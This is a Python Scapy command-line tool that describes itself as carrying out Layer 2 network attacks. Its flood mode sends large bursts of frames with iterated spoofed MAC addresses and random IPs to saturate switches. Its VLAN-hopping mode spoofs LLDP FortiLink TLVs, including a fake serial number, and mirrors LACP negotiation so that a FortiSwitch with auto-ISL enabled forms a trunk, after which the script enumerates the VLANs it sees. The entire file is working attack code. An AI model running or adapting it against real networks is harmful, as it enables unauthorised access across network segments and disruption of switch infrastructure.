#!/usr/bin/python3

# Requirements: Scapy for Python3 - apt-get install python3-scapy
# 		tcpreplay - apt-get install tcpreplay

import argparse
import os
import threading
import time
from scapy.all import *
from scapy.contrib.lldp import *
from scapy.contrib.lacp import *

# create parser
main_parser = argparse.ArgumentParser(description='Execute various Layer 2 network attacks.')

subparsers = main_parser.add_subparsers(dest='action')

flood_parser = subparsers.add_parser('flood',help='Flood packages')

vlanhop_parser = subparsers.add_parser('vlanhop',help='VLAN Hopping')


main_parser.add_argument("-v","--verbose", help="Increase output verbosity",action='count',default=0)
main_parser.add_argument("-i","--interface", help="Network Interface",default="ens33")

flood_parser.add_argument("-t","--floodtype",help="Flood type", choices =["unknown_unicast","unknown_multicast","unknown_broadcast"], required=True)
flood_parser.add_argument("-c","--packetcount",help="Amount of packets", default=65000,type=int)
flood_parser.add_argument("-d","--destinationip",help="Destination IP Address",default="0.0.0.0")
flood_parser.add_argument("-dmac","--destinationmac",help="Destination MAC Address",default="00:01:02:03:04:05")

#vlanhop_parser.add_argument("-a","--activerecon",help="Send additional packets to detect VLANs. Noisy!")
vlanhop_parser.add_argument("-ac","--autoint",help="Automatically create VLAN interfaces for all detected VLANs")

main_args = main_parser.parse_args()
action = main_args.action

if main_args.interface:
   conf.iface=main_args.interface

isl_link_flags = {
   "auto-isl":0,
   "auto-mclag-icl":1,
   "mclag-switch":2,
   "?":3,
   "isl-fortilink":4,
}


# level 0 = standard output, level 1 = info, level 2 = debug
def dprint(*args,level=0):
   if level <= main_args.verbose:
      print(' '.join(map(str, args)))


def fortilink_isl(lldp_keep_alive):
    dprint("Establishing FortiLink ISL",level=2)

    sendp(lldp_keep_alive,verbose=0)

    packet=sniff(filter="ether proto 0x8809",count=1,timeout=60)
    lacp_response=packet[0]
    del lacp_response.src
    lacp_response[LACP].actor_system = "00:0c:29:34:ab:f1"
    lacp_response[LACP].actor_system_priority = lacp_response[LACP].actor_system_priority - 1
    sendp(lacp_response,verbose=0)

    packet=sniff(filter="ether proto 0x8809",count=1,timeout=60)
    lacp_response[LACP].partner_system_priority = packet[0][LACP].actor_system_priority
    lacp_response[LACP].partner_system = packet[0][LACP].actor_system
    lacp_response[LACP].partner_key = packet[0][LACP].actor_key
    lacp_response[LACP].partner_port_priority = packet[0][LACP].actor_port_priority
    lacp_response[LACP].partner_port_number = packet[0][LACP].actor_port_number

    #lacp_response[LACP].partner_state = packet[0][LACP].actor_state
    #lacp_response[LACP].actor_state = packet[0][LACP].actor_state
    #sendp(lacp_response)

    # Todo: check for states

    while True:
       time.sleep(1)
       packet = sniff(filter="ether proto 0x8809", count=1, timeout=20)

       # Mirror settings of opposite LACP Trunk
       lacp_response[LACP].actor_state = packet[0][LACP].actor_state
       lacp_response[LACP].partner_state = packet[0][LACP].actor_state
       sendp(lacp_response,verbose=0)
       sendp(lldp_keep_alive,verbose=0)


def vlanhop(iface=main_args.interface):
    print("Launching vlanhop attack")
    print("Listening for LLDP packets")

    # Listen to LLDP packets
    packet=sniff(filter="ether proto 0x88cc",count=1,timeout=60)

    if (not packet[0]):
       dprint("FAIL: No LLDP packet received")
       return

    #todo: test if no packet received
    dprint("LLDP packet received:")
    dprint("System name:",packet[0][LLDPDUSystemName].system_name)
    dprint("System description:",packet[0][LLDPDUSystemDescription].description)
    dprint("Switchport interface:",packet[0][LLDPDUPortDescription].description)
    dprint("Switch management address:",inet_ntop(socket.AF_INET,(packet[0][LLDPDUManagementAddress].management_address)))

    if not (b"FortiSwitch" in packet[0][LLDPDUSystemDescription].description):
       dprint("FAIL: Not FortiSwitch LLDP Packet")
       return

    lldp_response = packet[0]
    lldp_response[LLDPDUChassisID].id = "00:0c:29:34:ab:f1"
    del lldp_response.src
    del lldp_response[LLDPDUSystemName]._length
    lldp_response[LLDPDUSystemName].system_name = ""

    i = 1
    dprint("Check for Fortigate TLVs")
    remoteAutoISL = False
    while packet[0].getlayer(LLDPDUGenericOrganisationSpecific, nb=i):
       org_layer = packet[0].getlayer(LLDPDUGenericOrganisationSpecific, nb=i)
       dprint("Found org code:",org_layer.org_code,level=2)

       if (org_layer.org_code==547598):
          dprint("Forticode found:",org_layer.subtype,level=2)
          #type 1 hostname
          if org_layer.subtype==1:
             dprint("FortiLink Hostname TLV ID 1",level=1)
             lldp_response.getlayer(LLDPDUGenericOrganisationSpecific, nb=i).data = "Trunkie"
             del lldp_response.getlayer(LLDPDUGenericOrganisationSpecific, nb=i)._length

          #type 2 serial
          elif org_layer.subtype==2:
             dprint("FortiLink Serialnumber TLV ID 2",level=1)
             dprint("Switch Serialnumber:",org_layer.data)
             lldp_response.getlayer(LLDPDUGenericOrganisationSpecific, nb=i).data = "S108DVWSM12345"
             del lldp_response.getlayer(LLDPDUGenericOrganisationSpecific, nb=i)._length

          #type 3 port_options
          elif org_layer.subtype==3:
             dprint("FortiLink link properties TLV ID 3",level=1)
             dprint("Link properties:",org_layer.data[3],level=1)
             if org_layer.data[3] & (1 << isl_link_flags["auto-isl"]):
                dprint("auto-isl is enabled!") 
                remoteAutoISL = True
                lldp_response.getlayer(LLDPDUGenericOrganisationSpecific, nb=i).data = b"\x00\x00\x02\x5b\x00\x10ABCDEFGHIJKLNMOP"

       i += 1

    if not remoteAutoISL:
       dprint("FAIL: Switch Auto-ISL is disabled")
       return

    # sendp(lldp_response)

    # Setup LACP Trunk

    lacp_thread = threading.Thread(target=fortilink_isl,args=(lldp_response,))
    lacp_thread.daemon = True  # Set as a daemon thread so it terminates when the main program exits
    lacp_thread.start()

    fortilink_packet=sniff(filter="ether proto 0x88ff",count=1,store=1,timeout=20)
    if not fortilink_packet:
        dprint("FAIL: No FortiLink packet received, ISL not established")
        return

    dprint("SUCCESS: FortiLink Packet received, ISL established")
    dprint("Listing detected VLANS:")

    detected_vlans = []

    while True:
       time.sleep(1)
       vlan_packet=sniff(count=10,timeout=5)
       for single_packet in vlan_packet:
          if (single_packet.haslayer(Dot1Q)):
             if not single_packet[Dot1Q].vlan in detected_vlans:
                 detected_vlans.append(single_packet[Dot1Q].vlan)
                 print(single_packet[Dot1Q].vlan)


    # Parse LLDP Parameters

    # Check if auto-isl enable

    # Send LLDP response


    # Sniff for VLAN packets / List results


def l2_flood(floodtype,iface=main_args.interface):
    ttl=10
    if floodtype == "unknown_multicast":
       print("Generating",main_args.packetcount,"multicast flood packets")
       base_mac_int = int.from_bytes(b'\x04\x00\x00\x00\x00\x00', 'big')
       if main_args.destinationip=="0.0.0.0":
          dstip = "224.0.0.0"
       dst_mac = "11:22:33:44:55:66"
       ttl=1


    if floodtype == "unknown_unicast":
       print("Generating",main_args.packetcount,"unicast flood packets")
       base_mac_int = int.from_bytes(b'\x04\x00\x00\x00\x00\x00', 'big')
       dstip = main_args.destinationip
       if main_args.destinationmac == "00:01:02:03:04:05":
          dst_mac = "10:22:33:44:55:66"

    if floodtype == "unknown_broadcast":
       print("Generating",main_args.packetcount,"broadcast flood packets")
       base_mac_int = int.from_bytes(b'\x0c\x00\x00\x00\x00\x00', 'big')
       dstip = main_args.destinationip
       if main_args.destinationip=="0.0.0.0":
          dstip = "255.255.255.255"
       if main_args.destinationmac == "00:01:02:03:04:05":
          dst_mac = "FF:FF:FF:FF:FF:FF"



    # generate packets in memory
    packet_list = []

    for i in range(1, main_args.packetcount):
        src_mac = ':'.join('%02x' % byte for byte in (base_mac_int + i).to_bytes(6, 'big')) # Iterate over source mac address, add one each loop
        frame = Ether(src=src_mac, dst=dst_mac) / IP(dst=dstip, src=RandIP(), ttl=ttl) / ICMP()
        packet_list.append(frame)

    print("Sending packets...",end="")
    sendpfast(packet_list, iface=iface)
    print("Done")




# Program start

if os.geteuid() != 0:
  print("--- Script not started as root user, possible permissions problem ---")


if action=="flood":
   l2_flood(floodtype=main_args.floodtype)

if action=="vlanhop":
   vlanhop()
